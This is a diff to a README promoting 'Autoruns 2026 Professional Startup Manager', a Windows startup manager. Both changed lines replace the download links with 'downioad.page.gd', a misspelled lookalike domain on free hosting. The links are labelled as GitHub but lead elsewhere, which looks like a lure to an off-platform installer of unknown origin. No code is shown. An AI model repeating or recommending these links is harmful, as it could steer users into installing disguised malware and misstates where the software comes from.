@@ -2,7 +2,7 @@
 
 Autoruns 2026 Professional Startup Manager is an advanced utility designed to provide deep insights and control over your Windows startup processes. Built on the legacy of the original Autoruns tool, this version offers an intuitive interface and additional features for optimizing boot performance. Whether you are a system administrator or a power user, this tool helps you streamline startup items, reduce boot times, and maintain system health.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ Currently, the tool requires a standard installation via the setup file. Portabl
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## License and Disclaimer
 
